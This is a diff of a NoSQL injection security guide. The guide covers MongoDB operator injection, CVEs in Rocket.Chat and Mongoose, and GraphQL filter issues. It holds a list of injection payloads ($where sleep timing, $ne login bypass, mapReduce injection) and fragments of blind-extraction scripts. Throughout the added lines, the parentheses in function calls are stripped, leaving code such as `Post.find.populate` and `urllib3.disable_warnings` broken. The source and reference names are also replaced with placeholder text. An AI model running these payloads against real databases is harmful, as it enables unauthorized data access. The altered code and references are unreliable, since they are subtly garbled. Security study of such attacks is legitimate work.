@@ -1,6 +1,6 @@
 # NoSQL injection
 
-{{#include ../banners/hacktricks-training.md}}
+{{#include ../banners/this collection-training.md}}
 
 ## Exploit
 
@@ -104,7 +104,7 @@ The **`$func`** operator in the [MongoLite](https://github.com/agentejo/cockpit/
 
 It's possible to use [**$lookup**](https://www.mongodb.com/docs/manual/reference/operator/aggregation/lookup/) to get info from a different collection. In the following example, we are reading from a **different collection** called **`users`** and getting the **results of all the entries** with a password matching a wildcard.
 
-**NOTE:** `$lookup` and other aggregation functions are only available if the `aggregate()` function was used to perform the search instead of the more common `find()` or `findOne()` functions.
+**NOTE:** `$lookup` and other aggregation functions are only available if the `aggregate` function was used to perform the search instead of the more common `find` or `findOne` functions.
 
 ```json
 [
@@ -169,14 +169,14 @@ This trick is parser-dependent and only applies when the application assembles J
 ## Recent CVEs & Real-World Exploits (2023-2025)
 
 ### Rocket.Chat unauthenticated blind NoSQLi – CVE-2023-28359
-Versions ≤ 6.0.0 exposed the Meteor method `listEmojiCustom` that forwarded a user-controlled **selector** object directly to `find()`. By injecting operators such as `{"$where":"sleep(2000)||true"}` an unauthenticated attacker could build a timing oracle and exfiltrate documents. The bug was patched in 6.0.1 by validating selector shape and stripping dangerous operators.<sup>[[6]](#references)</sup>
+Versions ≤ 6.0.0 exposed the Meteor method `listEmojiCustom` that forwarded a user-controlled **selector** object directly to `find`. By injecting operators such as `{"$where":"sleep(2000)||true"}` an unauthenticated attacker could build a timing oracle and exfiltrate documents. The bug was patched in 6.0.1 by validating selector shape and stripping dangerous operators.<sup>[[6]](#references)</sup>
 
-### Mongoose `populate().match` search injection – CVE-2024-53900 & CVE-2025-23061
+### Mongoose `populate.match` search injection – CVE-2024-53900 & CVE-2025-23061
 If an application forwards attacker-controlled objects into `populate({ match: ... })`, vulnerable Mongoose versions allow `$where`-based search injection inside the populate filter. CVE-2024-53900 covered the top-level case; CVE-2025-23061 covered a bypass where `$where` was nested under operators such as `$or`.<sup>[[7]](#references)</sup>
 
 ```js
 // Dangerous: attacker controls the full match object
-Post.find().populate({ path: 'author', match: req.query.author });
+Post.find.populate({ path: 'author', match: req.query.author });
 ```
 
 Use an allow-list and map scalars explicitly instead of forwarding the whole request object. Mongoose also supports `sanitizeFilter` to wrap nested operator objects in `$eq`, but it should be treated as a safety net rather than a replacement for explicit filter mapping:<sup>[[9]](#references)</sup>
@@ -184,14 +184,14 @@ Use an allow-list and map scalars explicitly instead of forwarding the whole req
 ```js
 mongoose.set('sanitizeFilter', true);
 
-Post.find().populate({
+Post.find.populate({
   path: 'author',
   match: { email: req.query.email }
 });
 ```
 
 ### GraphQL → Mongo filter confusion
-Resolvers that forward `args.filter` directly into `collection.find()` remain vulnerable:
+Resolvers that forward `args.filter` directly into `collection.find` remain vulnerable:
 
 ```graphql
 query users($f:UserFilter){
@@ -226,7 +226,7 @@ $where: '1 == 1'
 ', $or: [ {}, { 'a':'a
 ' } ], $comment:'successful MongoDB injection'
 db.injection.insert({success:1});
-db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1
+db.injection.insert({success:1});return 1;db.stores.mapReduce(function { { emit(1,1
 || 1==1
 || 1==1//
 || 1==1%00
@@ -238,7 +238,7 @@ db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emi
 {$gt: ''}
 [$ne]=1
 ';sleep(5000);
-';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);
+';it=new%20Date;do{pt=new%20Date;}while(pt-it<5000);
 {"username": {"$ne": null}, "password": {"$ne": null}}
 {"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
 {"username": {"$gt": undefined}, "password": {"$gt": undefined}}
@@ -251,7 +251,7 @@ db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emi
 ```python
 import requests, string
 
-alphabet = string.ascii_lowercase + string.ascii_uppercase + string.digits + "_@{}-/()!\"$%=^[]:;"
+alphabet = string.ascii_lowercase + string.ascii_uppercase + string.digits + "_@{}-/!\"$%=^[]:;"
 
 flag = ""
 for i in range(21):
@@ -269,7 +269,7 @@ import requests
 import urllib3
 import string
 import urllib
-urllib3.disable_warnings()
+urllib3.disable_warnings
 
 username="admin"
 password=""
@@ -338,7 +338,7 @@ for u in get_usernames(""):
 ## References
 
 - [1] [NoSQL, No Injection? – Ron Shulman-Peleg & Bronshtein](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2Fgit-blob-3b49b5d5a9e16cb1ec0d50cb1e62cb60f3f9155a%2FEN-NoSQL-No-injection-Ron-Shulman-Peleg-Bronshtein-1.pdf?alt=media)
-- [2] [PayloadsAllTheThings – NoSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
+- [2] [this collection – NoSQL Injection]
 - [3] [A NoSQL Injection Primer with Mongo – nullsweep](https://nullsweep.com/a-nosql-injection-primer-with-mongo/)
 - [4] [Hacking Node.js and MongoDB – Websecurify Blog](https://blog.websecurify.com/2014/08/hacking-nodejs-and-mongodb)
 - [5] [NoSQL Error-Based Injection – SensePost](https://sensepost.com/blog/2025/nosql-error-based-injection/)
@@ -349,4 +349,4 @@ for u in get_usernames(""):
 - [10] [RCE in Cockpit CMS via NoSQL Injection – PT SWARM](https://swarm.ptsecurity.com/rce-cockpit-cms/)
 - [11] [cr0hn/nosqlinjection_wordlists – MongoDB NoSQLi Payloads](https://github.com/cr0hn/nosqlinjection_wordlists/blob/master/mongodb_nosqli.txt)
 
-{{#include ../banners/hacktricks-training.md}}
+{{#include ../banners/this collection-training.md}}
